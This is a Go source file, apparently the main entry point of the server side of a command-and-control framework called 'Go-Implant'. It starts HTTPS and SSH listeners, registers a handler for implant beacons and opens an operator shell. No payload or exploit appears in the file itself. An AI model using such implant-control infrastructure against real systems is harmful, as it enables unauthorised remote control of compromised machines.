package main

import (
	"flag"
	"fmt"
	"go-implant/server/config"
	"go-implant/server/handler"
	"go-implant/server/model"
	"go-implant/server/ssh"
	"go-implant/server/view"
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/fatih/color"
)

func banner() {
	color.Set(color.FgYellow) // set color for the logging
	fmt.Println("\nGo-Implant")
	color.Unset() // Don't forget to unset
}

// Main
func main() {

	var certfile string
	var privkeyfile string

	// define command line arguments
	flag.IntVar(&config.SSHport, "sshport", 22, "port of SSH listener")
	flag.IntVar(&config.Handlerport, "handlerport", 443, "port of HTTP* listener")
	flag.StringVar(&certfile, "cert", "server.crt", "file with https cert")
	flag.StringVar(&privkeyfile, "privkey", "server.key", "file with private key for cert")
	useHTTP := flag.Bool("http", false, "use HTTP instead of HTTPS")

	// parse command line arguments
	flag.Parse()

	// init database
	model.InitDB()

	// print banner
	banner()

	// register beacon handler and start listening for beacons
	http.HandleFunc("/", handler.BeaconHandler)
	server := &http.Server{Addr: ":" + strconv.Itoa(config.Handlerport), ReadTimeout: time.Second * 10, ReadHeaderTimeout: time.Second * 10, WriteTimeout: time.Second * 10} // 10 second timeout on all (prevents DOS)
	server.SetKeepAlivesEnabled(false)                                                                                                                                       // don't allow keep-alives (prevents DOS)

	if *useHTTP {
		go func() {
			log.Println("Starting HTTP handler...")
			err := server.ListenAndServe()
			color.Set(color.FgRed)
			log.Printf("Error in HTTP handler: %s", err)
			color.Unset()
		}()
	} else {
		go func() {
			log.Println("Starting HTTPS handler...")
			err := server.ListenAndServeTLS(certfile, privkeyfile)
			color.Set(color.FgRed)
			log.Printf("Error in HTTPS handler: %s", err)
			color.Unset()
		}()
	}

	// start SSH handler
	go func() {
		log.Println("Starting SSH handler...")
		err := ssh.ServeSSH(config.SSHport)
		if err != nil {
			color.Set(color.FgRed)
			log.Printf("Error in SSH handler: %s", err)
			color.Unset()
		}
	}()

	// start ui
	view.Shell()
}
